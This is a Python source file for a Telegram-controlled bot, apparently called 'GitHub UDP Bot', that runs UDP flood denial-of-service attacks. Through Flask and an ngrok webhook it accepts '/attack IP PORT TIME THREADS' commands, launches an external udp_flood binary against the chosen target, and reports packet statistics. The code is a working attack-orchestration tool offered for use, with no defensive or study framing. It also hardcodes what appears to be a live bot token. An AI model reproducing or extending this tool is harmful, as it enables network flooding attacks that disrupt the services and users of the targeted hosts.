#!/usr/bin/env python3
import os
import subprocess
import threading
import time
import requests
from flask import Flask, request, jsonify
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import asyncio
from threading import Thread

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN', '7704220520:AAEI_ouYgKUdt52-ec9JJDjdo44pme781Ls')
AUTHORIZED_USERS = [7022875343]  # Replace with your user ID

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

# Global state
current_process = None
is_running = False
attack_stats = {"sent": 0, "errors": 0, "start_time": None}

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS

async def send_telegram_message(chat_id, text):
    try:
        await bot.send_message(chat_id=chat_id, text=text)
    except Exception as e:
        print(f"Error sending message: {e}")

def run_attack(target_ip, target_port, duration, threads, chat_id):
    global current_process, is_running, attack_stats
    
    try:
        is_running = True
        attack_stats = {"sent": 0, "errors": 0, "start_time": time.time()}
        
        # Run the attack
        current_process = subprocess.Popen(
            ['./udp_flood', target_ip, str(target_port), str(duration), str(threads)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Read output in real-time
        for line in iter(current_process.stdout.readline, ''):
            if 'Packets:' in line:
                # Parse stats from output
                if 'Sent:' in line:
                    try:
                        parts = line.split('Sent:')[1].split(',')
                        attack_stats['sent'] = int(parts[0].strip())
                        attack_stats['errors'] = int(parts[1].split('Errors:')[1].strip())
                    except:
                        pass
                print(line.strip())
        
        stdout, stderr = current_process.communicate()
        
        # Send completion message
        result_text = f"✅ Attack completed!\n{stdout}" if current_process.returncode == 0 else f"❌ Attack failed!\n{stderr}"
        asyncio.run(send_telegram_message(chat_id, result_text))
        
    except Exception as e:
        error_text = f"❌ Attack error: {str(e)}"
        asyncio.run(send_telegram_message(chat_id, error_text))
    finally:
        is_running = False
        current_process = None

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = Update.de_json(request.get_json(), bot)
        handle_update(update)
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'status': 'error'})

def handle_update(update):
    if not update.message:
        return
        
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    text = update.message.text or ""
    
    if not is_authorized(user_id):
        asyncio.run(send_telegram_message(chat_id, "❌ Unauthorized access!"))
        return
    
    if text.startswith('/start'):
        help_text = """
🚀 **GitHub UDP Bot**

**Commands:**
/start - Show this help
/attack IP PORT TIME THREADS - Start attack
/stop - Stop current attack  
/status - Show status
/stats - Show attack statistics

**Example:**
/attack 192.168.1.1 80 60 10
        """
        asyncio.run(send_telegram_message(chat_id, help_text))
        
    elif text.startswith('/attack'):
        global is_running
        
        if is_running:
            asyncio.run(send_telegram_message(chat_id, "⚠️ Attack already running! Use /stop first."))
            return
            
        parts = text.split()
        if len(parts) != 5:
            asyncio.run(send_telegram_message(chat_id, "❌ Usage: /attack IP PORT TIME THREADS"))
            return
            
        try:
            ip, port, duration, threads = parts[1], int(parts[2]), int(parts[3]), int(parts[4])
            
            # Validate
            if duration > 300:  # 5 min max
                asyncio.run(send_telegram_message(chat_id, "❌ Duration max: 300 seconds"))
                return
            if threads > 20:  # 20 threads max
                asyncio.run(send_telegram_message(chat_id, "❌ Threads max: 20"))
                return
                
            # Start attack
            asyncio.run(send_telegram_message(chat_id, 
                f"🎯 Starting attack...\n"
                f"📍 Target: {ip}:{port}\n"
                f"⏰ Duration: {duration}s\n"
                f"🧵 Threads: {threads}"))
                
            attack_thread = threading.Thread(
                target=run_attack, 
                args=(ip, port, duration, threads, chat_id)
            )
            attack_thread.daemon = True
            attack_thread.start()
            
        except Exception as e:
            asyncio.run(send_telegram_message(chat_id, f"❌ Error: {str(e)}"))
            
    elif text.startswith('/stop'):
        global current_process
        
        if not is_running:
            asyncio.run(send_telegram_message(chat_id, "ℹ️ No attack running"))
            return
            
        try:
            if current_process:
                current_process.terminate()
                current_process.wait(timeout=5)
            is_running = False
            asyncio.run(send_telegram_message(chat_id, "🛑 Attack stopped!"))
        except:
            if current_process:
                current_process.kill()
            is_running = False
            asyncio.run(send_telegram_message(chat_id, "🛑 Attack force stopped!"))
            
    elif text.startswith('/status'):
        status = "🟢 Running" if is_running else "🔴 Stopped"
        asyncio.run(send_telegram_message(chat_id, f"**Status:** {status}"))
        
    elif text.startswith('/stats'):
        if attack_stats['start_time']:
            elapsed = time.time() - attack_stats['start_time']
            stats_text = (
                f"📊 **Attack Statistics**\n"
                f"📤 Packets Sent: {attack_stats['sent']}\n"
                f"❌ Errors: {attack_stats['errors']}\n"
                f"⏱️ Elapsed: {int(elapsed)}s\n"
                f"📈 PPS: {int(attack_stats['sent'] / elapsed) if elapsed > 0 else 0}"
            )
        else:
            stats_text = "📊 No active attack statistics"
        asyncio.run(send_telegram_message(chat_id, stats_text))
        
    else:
        asyncio.run(send_telegram_message(chat_id, "❓ Unknown command. Use /start for help."))

def start_bot():
    """Start the bot with webhook"""
    try:
        # Get public URL from ngrok
        response = requests.get('http://localhost:4040/api/tunnels')
        tunnels = response.json()['tunnels']
        public_url = next(tunnel['public_url'] for tunnel in tunnels if tunnel['proto'] == 'https')
        
        # Set webhook
        bot.set_webhook(url=f"{public_url}/webhook")
        print(f"🤖 Bot started! Webhook: {public_url}/webhook")
    except Exception as e:
        print(f"❌ Failed to set webhook: {e}")

if __name__ == '__main__':
    # Start bot setup in background
    import threading
    threading.Thread(target=start_bot, daemon=True).start()
    
    # Start Flask server
    print("🚀 Starting Flask server on port 8080...")
    app.run(host='0.0.0.0', port=8080, debug=False)
